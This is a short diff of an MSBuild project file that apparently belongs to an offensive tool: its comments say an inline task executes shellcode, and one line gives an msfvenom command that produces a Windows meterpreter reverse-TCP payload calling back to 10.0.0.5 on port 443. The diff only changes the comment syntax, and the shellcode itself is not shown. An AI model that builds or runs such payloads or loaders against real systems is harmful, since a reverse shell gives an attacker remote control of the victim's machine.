@@ -1,5 +1,5 @@
-// Works with only x84 shellcode and only meterpreter.
-// msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
+<!-- Works with only x84 shellcode and only meterpreter. -->
+<!-- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp -->
 
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 <!-- This inline task executes shellcode. -->
